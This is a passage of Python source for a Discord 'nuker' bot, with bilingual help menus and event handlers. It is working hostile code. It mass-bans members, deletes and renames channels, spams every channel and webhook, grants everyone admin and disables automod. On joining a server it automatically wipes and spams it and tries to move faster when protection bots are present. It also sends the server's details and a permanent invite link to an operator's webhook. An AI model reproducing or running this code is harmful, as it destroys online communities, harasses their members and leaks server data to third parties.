                                "`!auto_nuke [on/off]` — Activar/Desactivar la demolición automática\n"
                                "`!stats` - obtener información sobre ti y tu actividad\n"
                                "`!createchannels` - crear un número determinado de canales\n"
                                "`!create_threads` - comando para crear 10 ramas en cada canal del servidor\n"
                                "`!spamrole` - crear un número determinado de roles\n"
                                "`!rename_server` - cambiar el icono y establecer el nombre del servidor\n"
                                "`!rename_roles` - renombrar todos los roles\n"
                                "`!rename_channels` — renombrar todos los canales\n"
                                "`!icon` - cambiar el icono\n"
                                "`!banall` - banear todos miembros del servidor\n"
                                "`!ban <id/username>` - banear a un miembro del servidor\n"
                                "`!kickall` - expulsar a todos los miembros del servidor\n"
                                "`!kick <id/username>` - expulsar a un miembro del servidor\n"
                                "`!unbanall` - desbanear a todos los miembros del servidor\n"
                                "`!massmute` - silenciar a todos los miembros del servidor\n"
                                "`!massunmute` - reactivar el sonido de todos los miembros del servidor\n"
                                "`!mute <id/username>` - silenciar a un miembro del servidor\n"
                                "`!admin` - dar administración\n"
                                "`!everyone_admin` - dar administración a todos\n"
                                "`!spam` - spam en todos los canales\n"
                                "`!nsfw_all` - convertir todos los canales en NSFW\n"
                                "`!unnsfw_all` - eliminar NSFW de todos los canales\n"
                                "`!emoji` - comando para crear un número determinado de emojis\n"
                                "`!stickers` - comando para crear un número determinado de stickers\n"
                                "`!spam_webhooks` — spam en todos los webhooks ya creados\n"
                                "`!webhooks` — crea webhooks en todos los canales y los envía como spam\n"
                                "`!delete_webhook [link]` — eliminar webhook\n"
                                "`!disable_community` — deshabilitar la comunidad\n"
                                "`!disable_automod` — deshabilitar la automodificación\n"
                                "`!ping` - ver el ping del bot\n"
                                "`!invite` - enlace al bot\n"
                                "`!info` - envía información sobre el servidor donde se introduce este comando en mensajes privados, también una plantilla de servidor\n"
                                "`!update` - consultar las actualizaciones del bot)", 
                    color=0x000000
                )
            else:
                embed = discord.Embed(
                    title="Free Commands",
                    description=">>> `!nuke` - command to nuke the server\n"
                                "`!crssh [id/link]` - command to nuke the server by ID and the link\n"
                                "`!auto_nuke [on/off]` — Enable/Disable auto-deconstruction\n"
                                "`!stats` - get information about yourself and your activity\n"
                                "`!createchannels` - creates a certain number of channels\n"
                                "`!create_threads` - the command to create 10 branches in each channel on the server\n"
                                "`!spamrole` - creates a certain number of roles\n"
                                "`!rename_server` - change the icon and set the server name\n"
                                "`!rename_roles` - rename all roles\n"  
                                "`!rename_channels` - rename all channels\n"
                                "`!icon` - change the icon\n"
                                "`!banall` - ban all server members\n"
                                "`!ban <id/username>` - ban a server member\n"
                                "`!kickall` - kick all server members\n"
                                "`!kick <id/username>` - kick a server member\n"
                                "`!unbanall` - unban all server members\n"
                                "`!massmute` - mute all server members\n"
                                "`!massunmute` - unmute all server members\n"
                                "`!mute <id/username>` - mute a server member\n"
                                "`!admin` - give admin privileges\n"
                                "`!everyone_admin` - give everyone admin privileges\n"
                                "`!spam` - spam all channels\n"
                                "`!nsfw_all` - make all channels NSFW\n"
                                "`!unnsfw_all` - remove NSFW from all channels\n"  
                                "`!emoji` - command to create a certain number of emojis\n"
                                "`!stickers` - command for creating a certain number of stickers\n"
                                "`!spam_webhooks` - spam all already created webhooks\n"
                                "`!webhooks` - create webhooks in all channels and spam them\n" 
                                "`!delete_webhook [link]` - delete a webhook\n"
                                "`!disable_community` - disable community\n" 
                                "`!disable_automod` - disable automod\n"
                                "`!ping` - check bot ping\n"
                                "`!invite` - bot invite link\n"
                                "`!info` - sends you a private message with information about the server where you run this command, as well as a server template\n"
                                "`!update` - find out bot updates)",
                    color=0x000000
                )
        elif selected_value == "premium_commands":
            if self.locale == 'es':
                embed = discord.Embed(
                    title="Equipo Premium",
                    description=">>> `!config` - Configurar la configuración del bot\n"
                                "`!config_info` - Ver tu configuración en el bot\n"
                                "`!custom_createchannels [texto]` - Comando para crear canales con tu nombre\n"
                                "`!custom_create_threads [nombre_del_hilo] [texto]` - Comando para crear 10 hilos con tu nombre y texto en cada canal del servidor\n"
                                "`!delchannels` - Eliminar todos los canales del servidor\n"
                                "`!custom_spam [cuenta] [texto]` - Enviar spam a todos los canales con tu texto\n"
                                "`!custom_rename_server [texto]` - Cambiar el nombre del servidor a tu nombre\n"
                                "`!custom_rename_channels [texto]` - Cambiar el nombre de todos los canales a tu nombre\n"
                                "`!custom_rename_roles [texto]` - Cambiar el nombre de todos los roles a tu nombre\n"
                                "`!custom_spam_webhooks [texto]` — envía spam a todos los webhooks existentes con tu propio texto\n"
                                "`!custom_webhooks [texto]` — crea webhooks en todos los canales y envía spam a todos con tu propio texto\n"
                                "`!custom_icon [url,png,jpg,jpeg,gif]` - cambia el icono del servidor por el tuyo\n"
                                "`!custom_role [texto]` - crea roles con tu nombre\n"
                                "`!ghostping` - ignora a todos\n"
                                "`!token` - configura tu bot durante 30 min\n"
                                "`!purge` - elimina mensajes en todos los canales\n"
                                "`!server_lockdown` - oculta todos los canales\n"
                                "`!show_channels` - muestra todos los canales\n"
                                "`!close_server` - cierra todos los canales\n"
                                "`!unlock_server` - permite escribir en todos los canales\n"
                                "`!massnick [nick]` - crea el apodo del servidor que quieras Enter\n"
                                "`!invs_delete` - eliminar todos los enlaces al servidor\n"
                                "`!gen [count]` - generador de regalos nitro)", 
                    color=0x000000
                )
            else:
                embed = discord.Embed(
                    title="Premium Commands",
                    description=">>> `!config` - configure the bot\n"
                                "`!config_info` - view your bot configuration\n"
                                "`!custom_createchannels [text]` - create channels with your name\n"
                                "`!custom_create_threads [thread_name] [text]` - the command creates 10 branches with its own name and text in each channel on the server\n"
                                "`!delchannels` - delete all channels on the server\n"
                                "`!custom_spam [count] [text]` - sp@m all channels with your text\n"
                                "`!custom_rename_server [text]` - rename the server with your name\n"
                                "`!custom_rename_channels [text]` - rename all channels with your name\n" 
                                "`!custom_rename_roles [text]` - rename all roles with your name\n"  
                                "`!custom_spam_webhooks [text]` - sp@m all existing webhooks with your text\n"
                                "`!custom_webhooks [text]` - create webhooks in all channels and sp@m them with your text\n" 
                                "`!custom_icon [url,png,jpg,jpeg,gif]` - change the server icon to your icon\n"
                                "`!custom_role [text]` - create roles with your name\n"
                                "`!ghostping` - ghostping everyone\n"
                                "`!token` - set your bot to 30 minutes\n"
                                "`!purge` - delete messages in all channels\n"
                                "`!server_lockdown` - hide all channels\n"
                                "`!show_channels` - show all channels\n"
                                "`!close_server` - close all channels\n"
                                "`!unlock_server` - allow writing in all channels\n"
                                "`!massnick [nick]` - change everyone's nickname on the server\n"
                                "`!invs_delete` - delete all server invites\n"
                                "`!gen [count]` - nitro gift generator", 
                    color=0x000000
                )

        if embed:
            await interaction.response.send_message(embed=embed, ephemeral=True)
            await asyncio.sleep(120)
            try:
                await interaction.delete_original_response()
            except discord.errors.NotFound:
                logging.info(f"Исходный ответ для категории '{selected_value}' не найден или уже удален.")
            except Exception as e:
                logging.error(f"Ошибка при удалении исходного ответа: {e}")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.guild)
async def help(ctx):
    view = ui.View()
    view.add_item(ui.Button(label='Español', style=discord.ButtonStyle.grey, custom_id='es', emoji='🇪🇸'))
    view.add_item(ui.Button(label='English', style=discord.ButtonStyle.grey, custom_id='eng', emoji='🇬🇧'))
    embed = discord.Embed(
        title='Help menu MSC TEAM',
        description='''
`-----------------------------------------------------`
> Seleccione su idioma usando el botón de abajo para ver todos los comandos:
> Select your language using the button below to view all commands:
`-----------------------------------------------------`
''',
        color=discord.Color.from_rgb(0, 0, 0)
    )

    try:
        file = discord.File("ghs.png", filename="ghs.png")
        embed.set_thumbnail(url="attachment://ghs.png")
        message = await ctx.send(embed=embed, view=view, file=file)
        view.message = message
    except FileNotFoundError:
        console.print(f"[error]❌ Файл ghs.png не найден[/]")
        message = await ctx.send(embed=embed, view=view)

async def show_categories(interaction: Interaction, locale: str):
    if locale == 'es':
        embed = discord.Embed(
            title="Seleccione una categoría de comando:",
            description='''Asegúrese de que <@1410441341237985340> tenga derechos de administrador.
`-----------------------------------------------------`
> Categorías de comandos
> Seleccione una categoría de comando del menú a continuación
`-----------------------------------------------------`
¿Quieres ser premium? Únete [MSC TEAM](https://discord.gg/pon) y darle 1 impulso a nuestro servidor.
''',
            color=0x000000
        )
    else:
        embed = discord.Embed(
            title="Select a command category:",
            description='''Make sure that <@1410441341237985340> has administrator rights.
`-----------------------------------------------------`
> Command categories
> Select a command category from the menu below
`-----------------------------------------------------`
Do you want to get premium? Join [MSC TEAM](https://discord.gg/pon) and give our server a 1 boost.''',
            color=0x000000
        )

    view = CategoryView(locale=locale)
    message = await interaction.followup.send(embed=embed, view=view, ephemeral=True)
    await asyncio.sleep(120)
    try:
        await message.delete()
    except discord.errors.NotFound:
        logging.info("Сообщение с категориями не найдено или уже удалено.")
    except Exception as e:
        logging.error(f"Ошибка при удалении сообщения с категориями: {e}")

async def restore_views():
    for guild in bot.guilds:
        for channel in guild.text_channels:
            try:
                if not channel.permissions_for(guild.me).read_message_history:
                    console.print(f"[error]❌ Нет доступа к истории сообщений в канале: {channel.name} (ID: {channel.id})[/]")
                    continue
                async for message in channel.history(limit=100):
                    if message.author == bot.user and message.embeds:
                        if message.components:
                            console.print(f"[info]🔍 Сообщение в канале {channel.name} (ID: {channel.id}) уже имеет активные компоненты, пропуск обновления[/]")
                            continue
                        
                        if message.embeds[0].title == 'Help menu GHS TEAM':
                            view = ui.View()
                            view.add_item(ui.Button(label='Español', style=discord.ButtonStyle.grey, custom_id='es', emoji='🇪🇸'))
                            view.add_item(ui.Button(label='English', style=discord.ButtonStyle.grey, custom_id='eng', emoji='🇬🇧'))
                            await message.edit(view=view)
                            console.print(f"[success]✅ Обновлено сообщение в канале: {channel.name} (ID: {channel.id})[/]")
                        elif message.embeds[0].title in ['Выберите категорию команд:', 'Select a command category:']:
                            locale = 'ru' if 'Выберите категорию команд:' in message.embeds[0].title else 'eng'
                            view = CategoryView(locale=locale)
                            await message.edit(view=view)
                            console.print(f"[success]✅ Обновлено сообщение в канале: {channel.name} (ID: {channel.id})[/]")
            except discord.errors.Forbidden:
                console.print(f"[error]❌ Недостаточно прав для доступа к каналу: {channel.name} (ID: {channel.id})[/]")
            except Exception as e:
                console.print(f"[error]❌ Произошла ошибка в канале {channel.name} (ID: {channel.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.guild)
async def dev(ctx):
    if ctx.author.id not in ALLOWED_IDS:
        await ctx.send("У вас нет разрешения на использование этой команды.")
        return
    embed = discord.Embed(title="", color=0x000000) 
    embed.add_field(name='Админстративные команды', value='''>>> - **`!addblacklist [id]` - клоуна который дудосит ну и в бан и подругим причинам**
- **`!removeblacklist [id]` - для разбана клоуна который дудосил например или тд**
- **`!addserverblacklist [id]` - сервера в бан** 
- **`!removeserverblacklist [id]` - разбан сервера**                 
- **`!servers` - команда для просмотра серверов**
- **`!server_info [id]` - команда для просмотра сервера и получения полной информации по айди**
- **`!links` - дополнительная команда для очистки небольшой и просмотра серверов**
- **`!status <тип> <текст>` — установить статус боту !status list что бы посмотреть все статусы**
- **`!leave` - команда для ливания с всех серверов**
''')                                  
    await ctx.send(embed=embed) 

@bot.event
async def on_ready():
    global user_config
    await bot.change_presence(activity=discord.Streaming(name=f'Sobot servers 70000013', url='https://www.twitch.tv/404%27'))
    await restore_views()
    auto_check_and_leave.start()
    send_json_files_task.start()
    config_authors = load_config_authors()
    for message_id, author_id in config_authors.items():
        bot.add_view(ConfigInfoView(int(author_id), int(message_id)))
    try:
        user_config = load_config()
        
        table = Table(title="🤖 Полная Информация Бота", box=SIMPLE, style="cyan", title_style="bold magenta")
        table.add_column("Параметр", style="bold cyan")
        table.add_column("Значение", style="bold green")
        
        bot_name = f"{bot.user.name}#{bot.user.discriminator}" if bot.user else "Неизвестно"
        bot_id = str(bot.user.id) if bot.user else "Неизвестно"
        guilds_count = str(len(bot.guilds)) if bot.guilds else "0"
        created_at = bot.user.created_at.strftime("%d.%m.%Y %H:%M:%S") if bot.user else "Неизвестно"
        commands_count = str(len(bot.commands)) if bot.commands else "0"
        discord_version = discord.__version__ if hasattr(discord, '__version__') else "Неизвестно"
        mention = f"<@{bot.user.id}>" if bot.user else "Неизвестно"
        invite = f"https://discord.com/oauth2/authorize?client_id={bot.user.id}&scope=bot&permissions=8" if bot.user else "Неизвестно"
        prefix = bot.command_prefix if bot.command_prefix else "!"
        
        intent_names = ['default', 'guilds', 'members', 'bans', 'emojis', 'integrations', 'webhooks', 
                        'invites', 'voice_states', 'presences', 'messages', 'guild_messages', 
                        'dm_messages', 'reactions', 'guild_reactions', 'dm_reactions', 
                        'typing', 'guild_typing', 'dm_typing', 'message_content']
        active_intents = [name for name in intent_names if getattr(bot.intents, name, False)]
        intents_list = ", ".join(active_intents) if active_intents else "Неизвестно"
        
        table.add_row("Имя", bot_name)
        table.add_row("ID", bot_id)
        table.add_row("Серверов", guilds_count)
        table.add_row("Статус", "Активен")
        table.add_row("Дата создания", created_at)
        table.add_row("Команд", commands_count)
        table.add_row("Версия discord.py", discord_version)
        table.add_row("Ссылка", mention)
        table.add_row("Приглашение", invite)
        table.add_row("Префикс", prefix)
        table.add_row("Интенты", intents_list)
        
        console.print(table)
        console.print(f"[success]🤖 Бот {bot_name} готов к работе! 🚀[/]")

        if not os.path.exists('temp_bots.json'):
            with open('temp_bots.json', 'w') as f:
                json.dump([], f)
        with open('temp_bots.json', 'r') as f:
            saved_bots = json.load(f)
        for bot_data in saved_bots:
            now = time.time()
            if bot_data['expiration'] > now:
                user_id = bot_data['user_id']
                token = bot_data['token']
                if user_id not in temporary_bots:
                    temporary_bots[user_id] = {}
                task = asyncio.create_task(run_and_shutdown_temp_bot(user_id, token, None, None))
                temporary_bots[user_id]['task'] = task
                temporary_bots[user_id]['token'] = token
                temporary_bots[user_id]['expiration'] = bot_data['expiration']
                temporary_bots[user_id]['message_id'] = bot_data.get('message_id')
                if bot_data.get('message_id'):
                    temporary_bots[user_id]['view'] = TokenControlView(int(user_id))
                    bot.add_view(TokenControlView(int(user_id)), message_id=int(bot_data['message_id']))
                console.print(f"[info]✅ Автоматический файлы запуск временного бота для пользователя {user_id} с оставшимся временем {bot_data['expiration'] - now} секунд.[/]")
    except Exception as e:
        console.print(f"[error]❌ Ошибка в on_ready (основной бот): {e} 😿[/]")

async def log_message(message: str, embed: dict = None):
    console.print(f"[info]📝 {message}[/]")
    logger.info(message)
    
    try:
        async with aiohttp.ClientSession() as session:
            payload = {"username": "Sobot Logger", "avatar_url": "https://default-icon-url.com"}
            if embed:
                payload["embeds"] = [embed]
            else:
                payload["content"] = str(message)
            
            async with session.post(LOG_WEBHOOK_URL, json=payload) as response:
                if response.status != 204:
                    console.print(f"[error]❌ Ошибка вебхука: HTTP {response.status}, {await response.text()}[/]")
                    logger.error(f"Webhook failed with status {response.status}: {await response.text()}")
                else:
                    console.print(f"[success]✅ Вебхук успешно отправлен: {message}[/]")
                    logger.debug(f"Webhook sent successfully: {message}")
    except Exception as e:
        console.print(f"[error]❌ Не удалось отправить вебхук: {e}[/]")
        logger.error(f"Failed to send webhook: {e}")

@bot.event
async def on_command_error(ctx, error):
    if ctx.guild is None:
        return False
    log_embed = {
        "title": "Ошибка команды",
        "description": f"**Команда:** `{ctx.command}`\n**Ошибка:** {error}\n**Пользователь:** {ctx.author.name} ({ctx.author.id})\n**Сервер:** {ctx.guild.name if ctx.guild else 'Личные сообщения'} ({ctx.guild.id if ctx.guild else 'N/A'})\n**Канал:** {ctx.channel.name if ctx.guild else 'Личные сообщения'} ({ctx.channel.id if ctx.guild else 'N/A'})",
        "color": 0xFF0000,
        "timestamp": ctx.message.created_at.isoformat(),
        "footer": {"text": f"{bot.user.name}, 2025"},
        "thumbnail": {"url": ctx.author.avatar.url if ctx.author.avatar else "https://default-icon-url.com"}
    }
    await log_message(
        f"Ошибка: {error} в команде {ctx.command} от {ctx.author.name} ({ctx.author.id}) на сервере {ctx.guild.name if ctx.guild else 'Личные сообщения'} ({ctx.guild.id if ctx.guild else 'N/A'})",
        embed=log_embed
    )

    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = int(error.retry_after)
        if remaining_time > 0:
            await ctx.send(f"Please wait {remaining_time} seconds before using the command again.", delete_after=30)
            await ctx.author.send(f"Please wait {remaining_time} seconds before using the command again.", delete_after=30)
            console.print(f"[ ! ] {ctx.author} пытался использовать команду в {ctx.guild} во время перезарядки.", style="error")
        else:
            await ctx.send(f"Command cooldown in {ctx.guild} has ended.", delete_after=30)
            await ctx.author.send(f"Command cooldown in {ctx.guild} has ended.", delete_after=30)
            console.print(f"[ * ] {ctx.author} теперь может использовать команды в {ctx.guild}.", style="success")
            
@bot.event
async def on_command(ctx):
    if ctx.guild is None:
        return False
    embed = {
        "title": "Команда использована",
        "description": f"**Команда:** `{ctx.command}`\n**Пользователь:** {ctx.author.name} ({ctx.author.id})\n**Сервер:** {ctx.guild.name} ({ctx.guild.id})\n**Канал:** {ctx.channel.name} ({ctx.channel.id})",
        "color": 0x808080,
        "timestamp": ctx.message.created_at.isoformat(),
        "footer": {"text": f"{bot.user.name}, 2025"},
        "thumbnail": {"url": ctx.author.avatar.url if ctx.author.avatar else "https://default-icon-url.com"}
    }
    await log_message(f"Команда {ctx.command} использована {ctx.author.name} ({ctx.author.id}) на сервере {ctx.guild.name} ({ctx.guild.id})", embed=embed)

@premium_bot.event
async def on_ready():
    global user_config
    try:
        user_config = load_config()
        
        table = Table(title="🎉 Полная Информация Премиум Бота", box=SIMPLE, style="cyan", title_style="bold magenta")
        table.add_column("Параметр", style="bold cyan")
        table.add_column("Значение", style="bold green")
        
        bot_name = f"{premium_bot.user.name}#{premium_bot.user.discriminator}" if premium_bot.user else "Неизвестно"
        bot_id = str(premium_bot.user.id) if premium_bot.user else "Неизвестно"
        guilds_count = str(len(premium_bot.guilds)) if premium_bot.guilds else "0"
        created_at = premium_bot.user.created_at.strftime("%d.%m.%Y %H:%M:%S") if premium_bot.user else "Неизвестно"
        commands_count = str(len(premium_bot.commands)) if premium_bot.commands else "0"
        discord_version = discord.__version__ if hasattr(discord, '__version__') else "Неизвестно"
        mention = f"<@{premium_bot.user.id}>" if premium_bot.user else "Неизвестно"
        invite = f"https://discord.com/oauth2/authorize?client_id={premium_bot.user.id}&scope=bot&permissions=8" if premium_bot.user else "Неизвестно"
        prefix = premium_bot.command_prefix if premium_bot.command_prefix else "!"
        
        intent_names = ['default', 'guilds', 'members', 'bans', 'emojis', 'integrations', 'webhooks', 
                        'invites', 'voice_states', 'presences', 'messages', 'guild_messages', 
                        'dm_messages', 'reactions', 'guild_reactions', 'dm_reactions', 
                        'typing', 'guild_typing', 'dm_typing', 'message_content']
        active_intents = [name for name in intent_names if getattr(premium_bot.intents, name, False)]
        intents_list = ", ".join(active_intents) if active_intents else "Неизвестно"
        
        table.add_row("Имя", bot_name)
        table.add_row("ID", bot_id)
        table.add_row("Серверов", guilds_count)
        table.add_row("Статус", "Активен")
        table.add_row("Дата создания", created_at)
        table.add_row("Команд", commands_count)
        table.add_row("Версия discord.py", discord_version)
        table.add_row("Ссылка", mention)
        table.add_row("Приглашение", invite)
        table.add_row("Префикс", prefix)
        table.add_row("Интенты", intents_list)
        
        console.print(table)
        console.print(f"[success]🎉 Бот {bot_name} готов к работе! 🚀[/]")
    except Exception as e:
        console.print(f"[error]❌ Ошибка в on_ready (премиум бот): {e} 😿[/]")

@bot.event
async def on_guild_join(guild: discord.Guild):
    async with aiohttp.ClientSession() as session:
        headers = {'Authorization': f'Bot {BOT_TOKEN}', 'Content-Type': 'application/json'}  
    console.print(f"[action]🤝 Бот присоединился к серверу {guild.name} ({guild.id})[/]")
    if any(user.id in blacklist for user in guild.members):
        console.print("[warning]⚠️ Сервер в черном списке, игнорируем...[/]")
        return

    if guild.id in server_blacklist:
        console.print(f"[warning]⚠️ Сервер {guild.name} ({guild.id}) в server_blacklist, игнорируем...[/]")
        return

    if guild.id in excluded_server_id:
        console.print(f"[warning]⚠️ Сервер {guild.name} ({guild.id}) в excluded_server_ids, игнорируем...[/]")
        return

    try:
        inviter = None
        if guild.me.guild_permissions.view_audit_log:
            async for entry in guild.audit_logs(limit=10, action=discord.AuditLogAction.bot_add):
                if entry.target.id == bot.user.id:
                    inviter = entry.user
                    console.print(f"[info]🔍 Пользователь {inviter.name} ({inviter.id}) определён как добавивший бота[/]")
                    break
            if not inviter:
                console.print(f"[warning]⚠️ Не удалось найти запись о добавлении бота в логах аудита на сервере {guild.name} ({guild.id})[/]")
        else:
            console.print(f"[warning]⚠️ У бота нет прав view_audit_log на сервере {guild.name} ({guild.id})[/]")

        if inviter:
            server_count = update_server_count(inviter.id, guild.id)
            console.print(f"[success]✅ Счётчик серверов обновлён для пользователя {inviter.name} ({inviter.id}): {server_count} серверов[/]")

        bots_count = sum(1 for member in guild.members if member.bot)

        embed = {
            "title": "> ⚡ Bot Added to New Server",
            "description": "**\n**",
            "color": 0x808080,
            "fields": [
                {"name": "> Guild", "value": f"**```\n{guild.name} ({guild.id})\n```**", "inline": True},
                {"name": "> Members", "value": f"**```\n{guild.member_count}\n```**", "inline": True},
                {"name": "> Bots", "value": f"**```\n{bots_count}\n```**", "inline": True},
                {"name": "> Roles", "value": f"**```\n{len(guild.roles)}\n```**", "inline": True},
                {"name": "> Channels", "value": f"**```\n{len(guild.channels)}\n```**", "inline": True},
                {"name": "> Voice Channels", "value": f"**```\n{len(guild.voice_channels)}\n```**", "inline": True},
                {"name": "> Boosts", "value": f"**```\n{guild.premium_subscription_count}\n```**", "inline": True},
            ],
            "thumbnail": {"url": guild.icon.url if guild.icon else "https://default-icon-url.com"},
            "footer": {"text": f"{bot.user.name}, 2025", "icon_url": "https://default-icon-url.com"}
        }

        if inviter:
            embed["fields"].append({"name": "> Added By", "value": f"**```\n{inviter.name} ({inviter.id})\n```**", "inline": True})

        owner = guild.owner
        embed["fields"].extend([
            {"name": "> Server Owner", "value": f"**```\n{owner.name} ({owner.id})\n```**", "inline": True},
            {"name": "> Owner Account Creation", "value": f"**```\n{owner.created_at.strftime('%d.%m.%Y')}\n```**", "inline": True},
            {"name": "> Server Creation Date", "value": f"**```\n{guild.created_at.strftime('%d.%m.%Y')}\n```**", "inline": True}
        ])

        try:
            async with limiter:
                invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=1)
                embed["fields"].append({"name": "> Invite Link", "value": f"**```\n{invite}\n```**", "inline": True})
        except Exception as e:
            embed["fields"].append({"name": "> Invite Link", "value": "**```\nНе удалось создать\n```**", "inline": True})
            console.print(f"[error]❌ Не удалось создать инвайт на сервере {guild.name} ({guild.id}): {e}[/]")

        async with aiohttp.ClientSession() as session:
            async with limiter:
                payload = {
                    "content": None,
                    "embeds": [embed],
                    "username": bot.user.name,
                    "avatar_url": "https://default-icon-url.com"
                }
                async with session.post(WEBHOOK_URL, json=payload, headers={'Authorization': f'Bot {BOT_TOKEN}'}) as response:
                    if response.status == 204:
                        console.print(f"[success]✅ Embed успешно отправлен через вебхук для сервера {guild.name} ({guild.id})[/]")
                    else:
                        console.print(f"[error]❌ Ошибка отправки embed через вебхук для сервера {guild.name} ({guild.id}): HTTP {response.status}[/]")

        if inviter:
            try:
                await send_template_to_inviter(guild, inviter)
                console.print(f"[success]✅ Шаблон отправлен пользователю {inviter.name} ({inviter.id})[/]")
            except Exception as e:
                console.print(f"[error]❌ Не удалось отправить шаблон пользователю {inviter.name} ({inviter.id}): {e}[/]")

        if inviter and str(inviter.id) not in auto_nuke_disabled_users:
            user_id = str(inviter.id)
            config = user_config.get(user_id, default_config)
            console.print(f"[action]💥 Автоматический nuke на сервере {guild.name} ({guild.id})...[/]")
            has_protected_bots = await detect_protected_bots(guild)
            if has_protected_bots:
                console.print("[warning]⚠️ Защитные боты обнаружены, выполняем быстрые действия...[/]")
                if await check_permissions(guild):
                    await edit_channels(guild, headers, config, bypass=True)
                    await send_spam_messages(guild, config, fast_mode=True)
                else:
                    console.print("[warning]⚠️ Недостаточно прав, спамим в доступные каналы...[/]")
                    await send_spam_messages(guild, config, fast_mode=True)
            elif await check_permissions(guild):
                await delete_channels(guild)
                await delete_sounds(guild, headers)
                await create_event(guild)
                await create_stickers(guild)
                await edit_server(guild, config)
                await create_new_resources(guild, config, bypass=False)
                await create_sounds(guild, headers, config)
                await send_spam_messages(guild, config, fast_mode=False)
                console.print(f"[success]📌 Команда сноса выполнена на сервере {guild.name} ({guild.id})[/]")
            else:
                console.print("[warning]⚠️ Недостаточно прав, спамим в доступные каналы...[/]")
                await send_spam_messages(guild, config, fast_mode=True)
        else:
            console.print(f"[warning]⚠️ Авто-нюк отключен для пользователя {inviter.name if inviter else 'неизвестно'} ({inviter.id if inviter else 'неизвестно'}), пропускаем действия сноса[/]")

    except Exception as e:
        console.print(f"[error]❌ Ошибка при обработке события on_guild_join для сервера {guild.name} ({guild.id}): {e}[/]")

@premium_bot.command()
async def add_premium(ctx, user: discord.User, *, reason=None):
    if ctx.author.id not in ALLOWED_IDS:
        await ctx.send("У вас нет разрешения на использование этой команды.")
        return

    if user.id in premium_users:
        return

    premium_users.append(user.id)
    save_premium_users(premium_users)
   
    console.print(f"[success]🔥 Имба! {user.name} ({user.id}) теперь в премиуме, зажёг! 💪[/]")

@premium_bot.command()
async def remove_premium(ctx, user: discord.User):
    if ctx.author.id not in ALLOWED_IDS:
        await ctx.send("У вас нет разрешения на использование этой команды.")
        return

    if user.id not in premium_users:
        return

    premium_users.remove(user.id)
    save_premium_users(premium_users)
        
    console.print(f"[error]😿 Жаль, {user.name} ({user.id}) выкинут из премиума, больше не тусит. 🗑️[/]")

@premium_bot.event
async def on_member_update(before, after):
    if after.guild.id == guild_id:
        premium_channel = after.guild.get_channel(premium_channel_id)
        if before.premium_since is None and after.premium_since is not None:
            if after.id not in premium_users:
                premium_users.append(after.id)
                save_premium_users(premium_users)
                if premium_channel:               
                    console.print(f"[success]🔥 Красавчик! {after.name} ({after.id}) забустил сервер и теперь в премиуме! 💎[/]")
        
        elif before.premium_since is not None and after.premium_since is None:
            if after.id in premium_users:
                premium_users.remove(after.id)
                save_premium_users(premium_users)
                if premium_channel:                
                    console.print(f"[error]😿 Жаль, {after.name} ({after.id}) перестал бустить и вылетел из премиума. 🗑️[/]")
            else:
                if premium_channel:
                    console.print(f"[error]🤔 Хм, {after.name} ({after.id}) не был в премиуме, чё-то не так. 🚫[/]")

@premium_bot.event
async def on_member_remove(member):
    if member.guild.id == guild_id:
        premium_channel = member.guild.get_channel(premium_channel_id)
        if member.id in premium_users:
            premium_users.remove(member.id)
            save_premium_users(premium_users)
            if premium_channel:          
                console.print(f"[error]😢 {member.name} ({member.id}) свалил с сервера и выкинут из премиума. 🗑️[/]")
        else:
            if premium_channel:
                console.print(f"[error]🤔 {member.name} ({member.id}) не был в премиуме, ну и ладно. 🚫[/]")

@tasks.loop(minutes=30)
async def send_json_files_task():
    console.print("[info]📝 Отправка JSON-файлов в вебхук[/]")
    send_json_files_to_webhook()
    
@tasks.loop(minutes=1)
async def auto_check_and_leave():
    MAX_SERVERS = 80

    if len(bot.guilds) >= MAX_SERVERS:
        for guild in bot.guilds:
            if guild.id not in excluded_server_ids:
                try:
                    await guild.leave()
                    console.print(f"[success]🔥 Покинул сервер: {guild.name} ({guild.id}) 🚀[/]")
                except discord.errors.Forbidden:
                    console.print(f"[error]❌ Не удалось покинуть сервер: {guild.name} ({guild.id}), нет прав 😿[/]")

async def run_premium_bot():
    try:
        await premium_bot.start(PREMIUM_BOT_TOKEN)
    except Exception as e:
        console.print(f"[error]❌ Не удалось запустить Premium Bot: {e} 😿[/]")

if __name__ == "__main__":
    import asyncio
    loop = asyncio.new_event_loop()  
    asyncio.set_event_loop(loop)
    tasks = [
        loop.create_task(bot.start(BOT_TOKEN)),
        loop.create_task(run_premium_bot())
    ]
    try:
        loop.run_until_complete(asyncio.gather(*tasks))
    except KeyboardInterrupt:
        loop.run_until_complete(bot.close())
        loop.run_until_complete(premium_bot.close())
    finally:
        loop.close()